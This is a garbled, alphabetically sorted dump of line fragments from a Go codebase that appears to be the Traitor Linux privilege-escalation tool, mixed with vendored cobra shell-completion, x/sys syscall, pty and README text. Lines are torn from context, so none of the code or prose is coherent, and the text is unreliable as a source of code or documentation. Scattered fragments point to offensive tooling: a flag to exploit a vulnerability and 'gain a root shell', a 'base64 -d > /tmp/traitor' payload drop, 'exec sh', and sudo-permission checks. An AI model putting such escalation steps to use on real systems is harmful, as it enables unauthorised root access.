 Extract the directive integer at the very end of the output following a colon (:)
 Extract the directive integer following a : from the last line
 Extract the last arg and escape it in case it is a space
 FILE_APPEND_DATA 
 FILE_EXECUTE 
 FILE_READ_ATTRIBUTES 
 FILE_READ_DATA 
 FILE_READ_EA 
 FILE_SHARE_WRITE)
 FILE_WRITE_ATTRIBUTES 
 FILE_WRITE_DATA 
 FILE_WRITE_EA 
 File completion by default if no other completions found
 File completion for directories only
 File extension filtering
 File extension filtering no longer mutually exclusive with bash usage
 Files generated through docker (use $cmd so you can Ctl-C the build or run)
 Filing a bug or feature
 Filing issues
 Fills the $activeHelp and $completions arrays.
 First disable ActiveHelp which is not supported for Powershell
 Fish won't add a space if the completion ends with any
 Flag Groups
 Flags
 Flags for CryptAcquireCertificatePrivateKey 
 Flags for CryptProtectPromptStruct 
 Flags for Crypt[Un]ProtectData 
 Flags for PFXImportCertStore 
 Folders
 For example zsh can match letters in the middle of words.
 For now we can provide helpers such as
 ForEach-Object {
 Foreground Colours
 Format
 Format the descriptions
 Fully POSIX-compliant flags (including short 
 GENERIC_WRITE
 GOROOT_BOOTSTRAP=$(go env GOROOT) ./make.bash
 Generate Go code listing errors and other 
 Generated by godefs
 Generated by mksyscall.pl
 Generated by mksysnum_${GOOS}.
 Generated files
 Generating Bash Completions For Your cobra.Command
 Generating Fish Completions For Your cobra.Command
 Generating PowerShell Completions For Your Own cobra.Command
 Generating Zsh Completion For Your cobra.Command
 Generating documentation for your command
 Generating shell completions
 Get the current command line and convert into a string
 Get the current mode
 GetLengthSid(tml.Label.Sid)
 Getting Traitor
 Go terminal/console support
 Golang dropped support for darwin 32bits since go1.15. Make sure the lib still compile with go1.14 on those archs.
 Handling of required flags
 Help Command
 Hidden flags
 Homebrew on Macs have version 1.3 of bash-completion which doesn't include
 How to contribute
 IOC_OUT
 IOC_VENDOR 
 IOC_WS2 
 If the last parameter is complete (there is a space following it)
 If there is only 1 completion and it is a flag with an = it will be completed
 Important not to quote the variable for count to work
 In The News
 InfoStatus values for CertTrustStatus struct 
 Install
 Installation
 Installation and Usage
 Installing
 Instead use 
 Intelligent suggestions (
 Invoke-Expression
 Issues and Contributing
 Join the flag back if we have an equal sign flag
 Just print an empty string here so the
 LMEM_ZEROINIT
 LOCK_NB:
 Legal requirements
 Let the type of C char be signed for making the bare syscall
 Let's ignore them or else it will break completion.
 License
 Like MenuComplete but we don't want to add a space here because
 Limit flag completions to directory names
 Limitations
 Linux will still error if we ask for user attributes on a file that
 Linux:
 Local Flag on Parent Commands
 Local Flags
 Look for the longest completion so that we can format things nicely
 MUI_MERGE_USER_FALLBACK
 MUTANT_QUERY_STATE
 Macs have bash3 for which the bash-completion package doesn't include
 Make sure the $Command is longer then the $CursorPosition before we truncate.
 Make sure we can fit a description of at least 8 characters
 Mark flags as required
 MenuComplete (works like zsh)
 MenuComplete will automatically show the ToolTip of
 Miscellaneous high-WORD flags for CertOpenStore function 
 More info
 Motivation
 NULL : pm.sn
 Neither the name of Google Inc. nor the names of its
 Nested subcommands
 New Build System (currently for 
 Not an activeHelp line but a normal completion
 Not expected to work but should still compile.
 Notice
 OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 O_EXCL):
 O_RDWR) {
 O_TRUNC):
 O_WRONLY 
 Old Build System (currently for 
 Only consider the completions that match
 Optional seamless integration with [viper](https://github.com/spf13/viper) for 12-factor apps
 Out-Null
 Out-String 
 Overview
 Parsed Arguments 
 Perform file completion
 Persistent Flags
 PersistentPostRun()
 PersistentPreRun()
 Positional and Custom Arguments
 PostRun()
 PowerShell completions
 PowerShell supports three different completion modes
 Pre compile the stdlib for 386/arm (32bits).
 Pre compile the stdlib.
 PreRun and PostRun Hooks
 PreRun()
 Prepare the command to obtain completions
 Prepare the command to request completions for the program.
 Print the activeHelp statements before we finish
 Projects using Cobra
 Properly format the description string which follows a tab character if there is one
 Providing Active Help
 Pull out the error names for later.
 Pull out the signal names for later.
 Questions
 Quick steps to contribute
 Redistributions in binary form must reproduce the above
 Redistributions of source code must retain the above copyright
 Ref: https://github.com/spf13/cobra/issues/1279
 Remove an extra 4 because we add 2 spaces and 2 parentheses.
 Remove any pre-existing completions for the program since we will be handling all of them.
 Remove the directive
 Remove the directive including the : and the newline
 Remove the flag part
 Report Issues / Send Patches
 Required flags
 Resulting Value 
 Return the success of having called _describe
 Returning and handling errors
 Run C program to print error and syscall strings.
 Run the command line that appears in the first line
 Run()
 SEEK_CUR 
 SEEK_SET 
 SERVICE_ADAPTER 
 SERVICE_CHANGE_CONFIG 
 SERVICE_DRIVER 
 SERVICE_ENUMERATE_DEPENDENTS 
 SERVICE_FILE_SYSTEM_DRIVER 
 SERVICE_INTERACTIVE_PROCESS
 SERVICE_INTERROGATE 
 SERVICE_PAUSE_CONTINUE 
 SERVICE_QUERY_CONFIG 
 SERVICE_QUERY_STATUS 
 SERVICE_RECOGNIZER_DRIVER
 SERVICE_SID_TYPE_UNRESTRICTED
 SERVICE_START 
 SERVICE_STOP 
 SERVICE_USER_DEFINED_CONTROL
 SERVICE_WIN32_SHARE_PROCESS
 SE_GROUP_ENABLED 
 SE_GROUP_ENABLED_BY_DEFAULT 
 SE_GROUP_INTEGRITY 
 SE_GROUP_INTEGRITY_ENABLED
 SE_GROUP_LOGON_ID 
 SE_GROUP_OWNER 
 SE_GROUP_RESOURCE 
 SE_GROUP_USE_FOR_DENY_ONLY 
 SE_PRIVILEGE_ENABLED 
 SE_PRIVILEGE_REMOVED 
 SE_PRIVILEGE_USED_FOR_ACCESS
 SHTDN_REASON_FLAG_PLANNED
 SYNCHRONIZE
 SYNCHRONIZE 
 Same as syscall_${GOOS}.go except that it contains code specific
 See README.md for more information about how the build system works.
 See types_darwin.c and types_linux.c for examples.
 SemverRegexpRaw 
 Separate activeHelp from normal completions
 Separate activeHelp lines from real completions.
 Set base env.
 Set the base env.
 Set the description to a one space string if there is none set.
 Setting no option default values for flags
 Shell
 Short circuit to optimize if we don't have descriptions
 Socket
 SocketDisableIPv6 {
 Some C libraries present alternate versions for binary compatibility
 Some os/arch require a different compiler. Run in docker.
 Some programs may output extra empty lines after the directive.
 Specify dynamic flag completion
 Specify valid filename extensions for flags that take a filename
 Split the command at the first space to separate the program and arguments.
 Start fresh
 Static completion of nouns
 Strip any description
 Strip any description before checking the length
 Submitting changes
 Support for 
 Supported Platforms
 Supported shells
 Supporting Go flags when using pflag
 TH32CS_SNAPMODULE 
 TH32CS_SNAPPROCESS 
 TH32CS_SNAPTHREAD
 TIMER_MODIFY_STATE
 TIMER_QUERY_STATE 
 TODO(jsing): Update this list for DragonFly.
 TODO: Fix compilation error on openbsd/arm.
 TODO: Merge the solaris PR.
 TOKEN_QUERY
 TabCompleteNext (default windows style - on each key press the next option is displayed)
 TabCompleteNext and in case we get something unknown
 Test script checking that all expected os/arch compile properly.
 The call to __%[1]s_prepare_completions will setup __%[1]s_comp_results
 The description is preceded by a TAB character.
 The first and second are the standard ones
 The following flag completion annotations are not supported and will be ignored for 
 The function 
 The functions corresponding to the above annotations are consequently not supported and will be ignored for 
 The gcc command line prints all the 
 The interface
 The plan9 package provides access to the raw system call
 The prompt format is only available from bash 4.4.
 The space after the program name is essential to trigger completion for the program
 The third is for low-level use by the ForkExec wrapper
 The user could have moved the cursor backwards on the command-line.
 There are three entry points:
 There is no directive specified
 There is no directive specified.  Leave $out as is.
 There is not directive specified
 This function calls the %[1]s program to obtain the completion
 This function does two things:
 This hand-written C file includes standard C headers and then
 This hand-written Go file implements system calls that need
 This hand-written assembly file implements system call dispatch.
 This happens because the $Command does not include the last space.
 This is needed because the CompletionResult does not accept an empty string as argument
 This is on stderr
 This script is documentation more than anything else.
 This script runs or (given -n) prints suggested commands to generate files for
 This script runs or (given -n) prints suggested commands to generate z files
 This source code refers to The Go Authors for copyright purposes.
 This source code was written by the Go contributors.
 Traitor
 Type: complete (normal completion)
 Type: menu-complete/menu-complete-backward and insert-completions
 UTF-16 surrogate area 
 Unimplemented
 Usage
 Usage Message
 Usage in Bash
 Usage in Go
 Use -E because on some systems bash builtin interprets 
 Use eval to handle any environment variables and such
 Use of this source code is governed by a BSD-style
 Use printf to strip any trailing newline
 Use the Docker-based build system
 User Guide
 User control of Active Help
 Using 1.6 as it is the base version for the RISCV compiler.
 Using the Cobra Generator
 Using the Cobra Library
 Version Constraints
 Version Flag
 Version Parsing and Comparison
 Version Sorting
 VersionRegexpRaw 
 Versioning
 Versioning Library for Go
 Vim files https://github.com/github/gitignore/blob/master/Global/Vim.gitignore
 Wait
 We add an extra empty parameter so we can indicate this to the go completion code.
 We add an extra empty parameter so we can indicate this to the go method.
 We are dealing with a flag with an =
 We cannot use CompletionResult here because
 We don't need descriptions anyway since there is only a single
 We first need to escape any : as part of the completion itself.
 We must first split on 
 We must return an error code here to let zsh know that there were no
 We need to use 
 We test if it is available before using it.
 Where-Object {
 Where-Object { $_ -ne $Out[-1] }
 With descriptions
 With descriptions and Mode 'Complete'
 With descriptions and Mode 'MenuComplete' The description of the current selected value will be displayed below the suggestions.
 Without descriptions
 Working with Flags
 Wrapped
 Write go tool cgo -godefs input.
 You set the mode with Set-PSReadLineKeyHandler -Key Tab -Function <mode>
 You should 
 You should instead use 
 You will need to start a new shell for this setup to take effect.
 Zsh completions
 Zsh completions standardization
 [ $((directive 
 [Tanzu Framework](https://github.com/vmware-tanzu/tanzu-framework)
 [nothing]        
 ]] 
 _IOC_IN
 _IOC_OUT 
 _IOC_PARAM_MASK
 __%[1]s_escapeStringWithSpecialChars) 
 __custom_func
 __restrict alen)
 __restrict anamelen)
 __restrict fromlenaddr)
 _filedir -d 
 _init_completion. This is a minimal version of that function.
 _init_completion. This is a very minimal version of that function.
 a <= buf[1] 
 a new architecture/operating system combination requires
 able to check what the actual completion will be.
 about the definitions.
 actual data structures that pass through to the kernel system calls.
 actual.LessThan(patched)
 addDisposition values for CertAddCertificateContextToStore function 
 additional help topic command is determined by the
 addr != nil {
 addr.Sockaddr.Addr.Family == AF_INET {
 addr.Sockaddr.Addr.Family == AF_INET6 {
 after having parsed the 
 aix
 aix/ppc64 script generates files instead of writing to stdin.
 aliases for your program and they will also support completions.
 aliashash variable is an associative array which is only supported in bash > 3.
 allows you to disable sorting of flags for help and usage message.
 alpha 
 amd64
 amd64 
 amd64)
 amd64p32 
 and
 and 
 and (b) describe the limitations and the code
 and added to 
 and be named
 and browsing to
 and not completion of the program name itself.
 and now when you run 
 and silently ignored
 and silently ignored.
 and similar used to turn on file completion
 and source this file from your PowerShell profile.
 and test $nofiles -eq 0
 and test $nospace -ne 0
 and thus
 another directory
 appName/
 are
 are modifiers for those actions.
 are things and 
 arg[0] == '-' 
 arg[1] != '-'))
 arg[1] == '-') 
 arguments on to godefs.
 arm
 arm 
 arm) 
 arm64
 arm64 
 arm64)
 arm64) 
 arm64be 
 asm files
 asm_${GOOS}_${GOARCH}.s
 assume Len included the NUL
 auto-generated tag files
 awk '{print $1}'))
 b == '
 b2 != 255
 b[0] == keyEscape 
 b[13] != '-' 
 b[18] != '-' 
 b[1] == '[' 
 b[1] == '[' {
 b[23] != '-' {
 b[2] == '1' 
 b[3] == '
 b[4] == '3' {
 b[m] == ' '
 b[n-1] == '
 base64 -d > /tmp/traitor
 based on:
 basep == nil {
 bash completion V2 for %-36[1]s -
 bash completion for %-36s -
 bash like
 beginning with z.
 bit)
 buf.String() 
 buf[0] <= Z 
 buf[1] <= z)
 buf[n-1] != 0 {
 buf[n-1] == '
 but never both:
 but not the root command's 
 but put the = back
 but we don't want a space after the =
 by doing 
 c != cmd.helpCommand {
 c <= 'Z' 
 c <= 'z' 
 c == '
 c == '/' 
 c >= 'A' 
 c.HasAvailableSubCommands() {
 c.Hidden {
 c.Name()
 c.Name() 
 c.Parent().helpCommand == c {
 c.RunE != nil
 c.Use
 c.check.Equal(con.check)
 c.parentsPflags.Lookup(f.Name) == nil {
 can be used.
 cbn
 cd cobra
 certenrolld_begin -- PROV_RSA_
 characters will be kept.
 check if we are handling a flag with special work handling
 checking formatting 
 clockid == CLOCK_MONOTONIC {
 clockid == CLOCK_THREAD_CPUTIME_ID {
 close(ch) }() // Cleanup signals when done.
 cmd.HasAlias(compCmdName) {
 cmd.HasAlias(next) {
 cmd.hasNameOrAliasPrefix(next) {
 cmd/
 cmsgAlignOf(datalen)
 cobra.ShellCompDirectiveNoFileComp
 columns (0 for no
 command but continue using your own.
 command directly allows you to run the Go debugger to troubleshoot your code.  You can also add printouts to your code
 command for programs that wish to use it.
 command when a typo happens. For example:
 command.
 command. 
 command.  It yields the following behavior:
 command.  Please refer to [debugging shell completion](shell_completions.md
 command.  To configure such options you must set
 command.)
 command:
 comments and converts
 comments giving prototypes for ones that can be generated.
 comments to generate the stubs.
 compat list shown
 compdef _%[1]s %[1]s
 complete after --flag=abc
 completion V2 supports descriptions for completions. When calling 
 completion when there are no other completions
 completion will make
 completions at once on the command-line we must remove the descriptions.
 completions found by _describe
 completions must be prefixed with the flag
 compopt 
 const 
 constructor ([
 continue
 creates typedef or enum names beginning with a dollar sign
 criteria than the prefix.
 d.Name 
 darwin
 darwin 
 datalen
 defaults
 delayTime 
 delayTime < avgTime
 describes three additional
 don't run the completion function when being source-ed or eval-ed
 down 
 downloading dependencies 
 dragonfly
 dragonfly 
 dwFindFlags for CertFindChainInStore when dwFindType == CERT_CHAIN_FIND_BY_ISSUER 
 dwFindType for CertFindCertificateInStore  
 dwFlags definitions for CryptAcquireContext 
 e != nil {
 e == EPERM 
 e.flagName 
 e.subCommand 
 e1 == EAGAIN 
 e1 == ERROR_ALREADY_EXISTS {
 e1 == ERROR_ALREADY_EXISTS] = kernel32.CreateEventExW
 e1 == ERROR_ALREADY_EXISTS] = kernel32.CreateEventW
 e1 == ERROR_ALREADY_EXISTS] = kernel32.CreateFileMappingW
 e1 == ERROR_ALREADY_EXISTS] = kernel32.CreateMutexExW
 e1 == ERROR_ALREADY_EXISTS] = kernel32.CreateMutexW
 encounter ([
 entry == nil {
 entry.AllCommands) 
 entry.AllUsers) 
 entry.Hostname == hostname
 entry.HostnameMatches {
 entry.NoPasswd) {
 environment variable. See 
 epEvt) != 0 {
 epollwait
 er != nil {
 err != ENOENT {
 err != ENOSYS 
 err != EPERM {
 err != ERANGE {
 err != ETIME {
 err != io.EOF {
 err != nil 
 err != nil {
 err == nil 
 err == nil {
 err == syscall.EINVAL {
 err.Error())
 errno != 0 {
 errno != nil {
 errorList[i].num == e {
 errors[i-1] == e)
 errors[i-1].num == e)
 etc...
 ex: ts=4 sw=4 et filetype=sh
 exec sh
 exec sh 1>
 exists {
 exit
 exit 1
 exit 1)
 explicit
 explicitly.
 exploitName == exploit.Name {
 field of 
 field on the 
 field to provide a Go function that Cobra will execute when it needs the list of completion choices for the nouns of a command.  Note that either 
 field.
 file to look something like this
 file. The function
 filter the result
 filtering (not full glob filtering)
 first[0] == '-' {
 fish completion for %-36s -
 fish completions
 flag annotation).
 flag as well) then 
 flag for dwFindType CertFindChainInStore  
 flag if the current user password is known.
 flag if the current user password is known. The password will be requested if it's needed to analyse sudo permissions etc.
 flag is provided by user.
 flag they MUST provide the 
 flag to attempt to exploit a specific vulnerability and gain a root shell.
 flag to the completion sub-commands:
 flag.
 flag.Changed {
 flag.Name
 flag.Shorthand
 flagCompletion {
 flaghash variable is an associative array which is only supported in bash > 3.
 flags are available on
 flags.
 flagset
 flagset. This is usually necessary
 for details about the
 for example has a bash v1 completion script of over 13K lines)
 for examples.
 for file 
 for more info about PowerShell profiles.
 for ones that can be auto-generated.  Mksyscall reads those
 for the current system.  Running those commands is not automatic.
 for the generated
 for usage message
 form (unlike bash)
 form of flags
 found {
 freebsd
 freebsd 
 from grantpt(3): Calling grantpt() is equivalent to:
 from ptm(4):
 from ptsname(3): The ptsname() function is equivalent to:
 function and select what Active Help messages
 function of your command. The 
 function prototype
 function to return a version without prerelease or metadata ([
 function.
 functions or a combination of 
 functions will be executed before 
 functions will be inherited by children if they do not declare their own.  These functions are run in the following order:
 functions.
 functions. To include descriptions use 
 functions. You must provide these functions with a parameter indicating if the completions should be annotated with a description
 fv.IsBoolFlag() {
 g1582ns100
 gc 
 gccgo
 gccgo 
 get directive from last line
 git checkout 04885fddd096d09d4450726064d06dd107e374bf
 github.com/creack/pty v1.1.18
 github.com/google/uuid v1.3.0
 github.com/hashicorp/go-version v1.5.0
 github.com/inconshreveable/mousetrap v1.0.0
 github.com/liamg/tml v0.6.0
 github.com/spf13/cobra v1.5.0
 github.com/spf13/pflag v1.0.5
 go 1.12
 go 1.13
 go 1.15
 go 1.17
 go run mkpost.go
 go tools.
 go1.12
 go1.12 
 go1.13
 go1.9
 gofmt -w zsyscall_$GOOSARCH.go 
 gofmt < _$i > $i
 golang.org/x/crypto v0.0.0-20220525230936-793ad666bf5e
 golang.org/x/sys v0.0.0-20220615213510-4f61da869c0c
 golang.org/x/term v0.0.0-20220526004731-065cf7ba2467
 grep -f _error.grep 
 grep -f _signal.grep 
 grep -v SYS__
 grep -vf _error.grep 
 grep -vf _signal.grep
 groups
 has chosen to support three levels for Active Help: 
 has the wrong values if the cursor was moved
 have to type either an = or a space after the flag name.
 help [path to command] for full details.
 helper methods ([
 how many arguments can be passed to the kernel.
 https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-win32_find_dataw describe
 https://github.com/spf13/cobra/issues/1508
 https://golang.org/issue/42637
 i != -1 {
 i < 10
 i < 14
 i < 16
 i < 2
 i < 3
 i < 32
 i < 4
 i < 8
 i < biggestLen
 i < c.si-1
 i < echoTimes
 i < fsCount
 i < fs_count
 i < hS
 i < int(got)
 i < len(b)
 i < len(buf)
 i < len(bufW)
 i < len(iovecs)
 i < len(m.Data)
 i < len(name)
 i < len(parts)-1
 i < len(s)
 i < len(sa.Addr)
 i < len(str)
 i < len(t.line)
 i < len(usage)
 i < longest 
 i < n
 i < n 
 i < samples
 i < uint32(recHeader.number)
 i <= len(s)
 i = i 
 i >= len(f.args) {
 i<nelem(errors)
 i<nelem(signals)
 idx >= len(bit2idx) {
 idx)) 
 if the flag is on the command line without any options
 if the word contained an =
 if we are to align the descriptions.
 illumos
 illumos code generation requires a --illumos switch
 implementation in the 
 implements system
 in flags. If the golang flag was more than a single
 in the following example:
 in their shell.
 in6_addr 
 in_addr 
 include and which symbols need to be 
 incompatible with bash)
 index < 0 {
 index >= 0 {
 insert space after value
 int(b[1])
 int(p[1])
 int(s) < len(signals) {
 int64(ft.LowDateTime)
 int64(r0))
 int64(r1))
 int64(ts.Nsec)
 int64(ts.Nsec) }
 int64(tv.Usec)
 int64(tv.Usec)) 
 interface of the underlying operating system.  Porting Go to
 internal/mkmerge
 ioctl_num
 iota
 ip=1234         
 ip=1357         
 ip=4321         
 is 
 is a Go function that obtains the list of current Helm releases running on the Kubernetes cluster.
 is a command line program to generate cobra applications and command files.
 is bound with 
 is done through the 
 is no longer needed.  It is therefore 
 is not supported and will be ignored for 
 is replaced by an 
 is set to.
 is the name of your 
 is undefined or 
 isAttr {
 isBg {
 isElevated != 0
 isFg {
 isGroupMember(int(st.Gid)) {
 it does not accept an empty string as argument.
 it encounters while processing the input
 it is ParseFlags() that merges the inherited and
 it is currently not exposed in <asm/unistd.h>.
 it obtains
 it once it arrives.
 it opens a
 it sets console_loglevel to
 it won't change.
 itoa(-val)
 itoa(int(ordinal))
 itoa(int(s))
 itoa(len(a)) 
 j < len(usage)
 j < sectionDesc.number
 j <= len(t)
 keep flag value with flagname as flaghash
 key != keyEnter {
 key <= 0xdbff
 key is last byte in mapping
 kubectl_delete 
 kubectl_describe 
 kubectl_stop)
 lastArg[0] == '-' {
 left 
 len 
 len == 0 {
 len(arg) == 2 
 len(args) > 0 {
 len(args) > max {
 len(b) >= 3 
 len(b) >= 6 
 len(buf) > 0 {
 len(c.Deprecated) != 0 
 len(d.Gid) 
 len(d.Muid)
 len(d.Name) 
 len(d.Uid) 
 len(data) != cap(data) {
 len(flag.Deprecated) > 0
 len(p) == 0 {
 len(ret) > 0 {
 len(s) == 1 {
 len(s) == 2 
 len(sa.Name) > 8 {
 len(set) == 1 {
 len(suggestions) > 0 {
 len(toComplete) > 0 
 len(unset) == 0 {
 len(versionBits) <= 1 {
 let it know that a system call is running.
 license that can be found in the LICENSE file.
 like so:
 linux
 linux 
 local.Lookup(f.Name) == nil {
 long versions)
 looks like:
 loong64
 loong64 
 m < n 
 m.Header.Type == IPV6_ORIGDSTADDR:
 m.Header.Type == IP_ORIGDSTADDR:
 m68k 
 macOS:
 macros in your include statements.
 maj < 5 {
 mask)
 matching algorithms to attempt to find completions.
 may not already be filtered so as to allow fish to match on different
 method from panicking on 
 methods ([
 min != 9) 
 min <= 2)) 
 min > 2) {
 minCommandPathPadding > c.parent.commandsMaxCommandPathLen {
 minNamePadding > c.parent.commandsMaxNameLen {
 minUsagePadding > c.parent.commandsMaxUseLen {
 minor < 8:
 mips
 mips 
 mips) 
 mips64
 mips64 
 mips64)
 mips64) 
 mips64le
 mips64le 
 mips64le)
 mips64le) 
 mips64p32 
 mips64p32le 
 mipsle
 mipsle 
 mipsle)
 mipsle) 
 mkerrors.sh
 mksyscall.go
 mksysnum
 mode.
 more fields might be present here. 
 mousetrap
 mousetrap.StartedByExplorer() {
 msgAndCertEncodingType values for CertOpenStore function 
 much of the process.  The auto-generated files have names
 must invoke accept()
 n == -1 {
 n == 0 {
 n > 0 
 n > 0 {
 n > 1000 {
 n > 1024 {
 n > 1<<20 {
 n > capArSizeMax {
 n > len(buf) 
 n >= s.size {
 n-- {
 name
 name 
 name == ifs.Name) {
 name[0] != '@' {
 name[0] == '-' 
 name[0] == '=' {
 namlen 
 namoff
 need sysconf() call otherwise
 needsConvert {
 needspace <= 0 {
 netbsd
 netbsd 
 nf < len(f)-1
 nios2 
 nlPos < w {
 no longer needed in this context and silently ignored
 nsec_per_sec / int64(ticks_per_sec)
 nsid != EXTATTR_NAMESPACE_USER {
 o == nil {
 of a Contributor
 of a command.  Please notice the use of 
 of the generated file to regenerate it.
 offset)
 ok 
 ok {
 on a per-argument position basis (zsh-specific)
 on the 
 on the old system). This file includes standard C headers and
 on whitespace into an initial substring up to
 only completes directories (zsh-specific)
 only we can define Sockaddrs
 openbsd
 openbsd 
 openbsd)
 openbsd) 
 option is really only valid/useful on the root command. Doing the above will cause 
 or 
 or test $dirfilter -eq 1
 or test $nofiles -eq 0
 os.IsNotExist(err) {
 os.execl(
 os.system(
 otherNumeric {
 otherwise
 otherwise fall back to unqualified for compatibility
 out 
 over 
 p != nil
 p = p.Parent() {
 p.Name 
 pEvt) != 0 {
 package ([Kubectl docs](https://kubernetes.io/docs/tasks/tools/install-kubectl/
 package. You should update the help text of your completion command to show how to install the 
 parameter overrides the one set in c.SysProcAttr.
 part about preparing this file is figuring out which headers to
 passn
 passn < 5
 patch >= 102:
 patch >= 11:
 patch >= 25:
 pdwKeySpec for CryptAcquireCertificatePrivateKey 
 policyOID values for CertVerifyCertificateChainPolicy function 
 popd >/dev/null 2>
 pos
 powershell completion for %-36[1]s -
 pp.Len > SizeofSockaddrUnix {
 pp.Path[0] == 0 {
 pp.Path[n] != 0 {
 ppc
 ppc 
 ppc)
 ppc64
 ppc64 
 ppc64) 
 ppc64le
 ppc64le 
 ppc64le)
 ppc64le) 
 preSelf > preOther {
 prefix having been typed
 present {
 program. When
 pty
 r <= 'Z') {
 r <= 'z') 
 race
 race)
 race) 
 real completion which the shell will expand immediately.
 reclen > uint64(len(buf)) {
 registration.Speed == speed {
 remove
 remove directive (last element) from out
 remove the space here
 replaced by an 
 request.header.outputDesc.offset == 0 {
 results and the directive.  It fills the 'out' and 'directive' vars.
 ret != CR_SUCCESS {
 ret == CR_SUCCESS {
 return
 return here to prevent the completion of the extensions
 returns them to the caller in struct ptmget.
 right 
 right) != right {
 rights in the Source Code Form.
 riscv 
 riscv64
 riscv64 
 riscvdev branch HEAD as of 2019-06-29.
 rm -f _errors.c _errors _const.go _error.grep _signal.grep _error.out
 rsa.Addr.Family == AF_UNSPEC 
 rsa.Addr.Len == 0 {
 runes in length and the remainder. Will go 
 running lint tools 
 running tests 
 s.bg
 s.fg 
 s390 
 s390x
 s390x 
 s[0] != '-' 
 s[13] != '-' 
 s[18] != '-' 
 s[2
 s[23] != '-' {
 sa.Ifindex > 0x7fffffff {
 sa.Port > 0xFFFF {
 salign - 1) 
 sectionDesc.offset 
 sed 's
 sed 's/=
 see
 see README.md. DO NOT EDIT.
 see README.md. DO NOT EDIT.'
 see golang.org/issue/14808
 see syscall_${GOOS}.go above.
 see syscall_linux_
 see types_${GOOS}.c above.
 separated value
 separator.  This technique applies to completions returned by 
 session
 set {
 sh 1>
 sh > _$i 
 shbe 
 shell does not start to complete paths.
 shellCompDirectiveError)) -ne 0 ]
 shellCompDirectiveFilterDirs)) -ne 0 ]
 shellCompDirectiveFilterFileExt)) -ne 0 ]
 shellCompDirectiveNoFileComp)) -eq 0 ]
 shellCompDirectiveNoFileComp)) -ne 0 ]
 shellCompDirectiveNoSpace)) -ne 0 ]
 shift
 short != nil {
 shorthands[1] == '=' {
 shows the commands that will be run.
 sig == 0 {
 signalList[i].num == s {
 signals[i-1] == e)
 signals[i-1].num == e)
 siz
 skip the argument to a two word flag
 slashes > 0
 slashes-- {
 so use the last argument
 so we can properly delete any completions provided by another script.
 solaris
 solaris 
 solaris) 
 sort
 sort -Vr 
 source
 space or tab
 sparc 
 sparc64
 sparc64)
 srcPos
 stat)
 store characteristics (low WORD of flag) for CertOpenStore function 
 store locations (high WORD of flag) for CertOpenStore function 
 store temporary because switch will overwrite $_
 storeProvider values for CertOpenStore function 
 str 
 string escape --style=regex)
 string(name[:i])
 stringToAppend
 strings.TrimSpace(buf.String()) 
 strip everything after the =
 struct ptmget pm
 style documentation for the package can be viewed online without
 sub-command. Doing so will give results like:
 sub-command. Let's assume the Helm releases on the cluster are: 
 subCmd == cmd.helpCommand {
 subCmd == finalCmd.helpCommand {
 subCmd.Name() != ShellCompRequestCmd {
 suggestByPrefix {
 suggestions as it did for 
 support the legacy dynamic completion
 swap
 syscall.O_CLOEXEC)
 syscall.Signal(w>>shift) != SIGKILL }
 syscall.Signal(w>>shift) != SIGSTOP }
 syscall.Signal(w>>shift) == SIGSTOP }
 syscall_${GOOS}.go
 syscall_${GOOS}_${GOARCH}.go
 sysctlMib[i].ctlname == name {
 t.Kind() == reflect.Ptr {
 t.cursorX == 0 
 t.cursorX == 0 {
 t.cursorY == 0 {
 t.cursorY == 0:
 take in as flagvalue after the =
 temporary
 terminator null
 that can
 the 
 the Architecture/OS specified by the GOARCH and GOOS environment variables.
 the existing completions will only be loaded if the program can be found.
 the flag part from $cur
 the group is only enforced on commands where every flag is defined
 the highlighted value at the bottom of the suggestions.
 the user need to press space anyway to get the completion.
 then
 then this dynamic completion will give results like:
 there is almost always a 
 they differ only in
 they differ only in how many
 this allows it to be a member of multiple groups if needed.
 this is what will trigger other
 this will break the auto-completion script so must be removed.
 time.Millisecond
 time.Second
 tml
 tml - Terminal Markup Language
 to ${GOOS} on one particular architecture.
 to a maximum width 
 to achieve the same behavior
 to checkout the new release of the source.
 to install the latest version
 to possibly call handle_go_custom_completion.
 to prepare the arguments properly
 to provide the default 
 to provide the user with the 
 to truncate the command-line ($Command) up to the $CursorPosition location.
 to truncate the command-line ($words) up to the $CURRENT location.
 to truncate the command-line ($words) up to the $cword location.
 to turn off file completion
 to turn off file completion on a per-argument basis
 to valid pods!
 toComplete[0] == '-' 
 treated as equal.
 trimTrailingWhitespaces}}
 trimTrailingWhitespaces}}{{end}}{{if .HasAvailableInheritedFlags}}
 trimTrailingWhitespaces}}{{end}}{{if .HasHelpSubCommands}}
 truncate the descriptions that are too long for the shell width
 try command name qualified custom func
 types files
 types_${GOOS}.c
 uint(b[i]-'0')
 uint32(b[1])<<8 
 uint32(b[2])<<16 
 uint32(b[3])<<24
 uint32(b[5])<<8 
 uint32(b[6])<<16 
 uint32(b[7])<<24
 uint32(pri) }
 uint32(unsafe.Sizeof(
 uint32(unsafe.Sizeof(fileHandle{}))
 uint64(b[0])<<24
 uint64(b[0])<<56
 uint64(b[0])<<8
 uint64(b[1])<<16 
 uint64(b[1])<<48 
 uint64(b[1])<<8
 uint64(b[1])<<8 
 uint64(b[2])<<16 
 uint64(b[2])<<40 
 uint64(b[2])<<8 
 uint64(b[3])<<24
 uint64(b[3])<<24 
 uint64(b[4])<<24 
 uint64(b[5])<<16 
 uint64(b[5])<<40 
 uint64(b[6])<<48 
 uint64(b[6])<<8 
 uint64(b[7])<<56
 uint64(h.Len) > uint64(len(b)) {
 uint64(minor)
 uint8((version
 uint8(attr))
 uintptr(SizeofRawFileDedupeRange) 
 uintptr(cmsgAlignOf(SizeofCmsghdr)) 
 uintptr(group)<<8 
 uintptr(i))) = int32(fd)
 uintptr(len(buf))
 uintptr(n)
 uintptr(unsafe.Pointer(fCookie.fobj)) == uintptr(peInt.Object) {
 uitoa(uint(-val))
 uname -a ) 2>/dev/null
 unix.BRKINT 
 unix.ECHONL 
 unix.ICANON 
 unix.ICRNL 
 unix.IEXTEN
 unix.IGNCR 
 unix.INLCR 
 unix.ISIG
 unix.ISIG 
 unix.ISTRIP 
 unix.IXON
 unix.PARENB
 unix.PARMRK 
 unsafe.Sizeof(
 unsafe.Sizeof(DevInfoListDetailData{}.remoteMachineName))
 unsafe.Sizeof(DrvInfoDetailData{}.hardwareID))
 unsafe.Sizeof(fileHandle{}))
 up 
 usage[j
 use 
 use out() accessor
 use type name.
 used to provide completion choices on a per-argument position basis (zsh-specific)
 used to turn on file completion 
 used to turn on file completion on a per-argument position basis
 using 
 uuid ![build status](https://travis-ci.org/google/uuid.svg
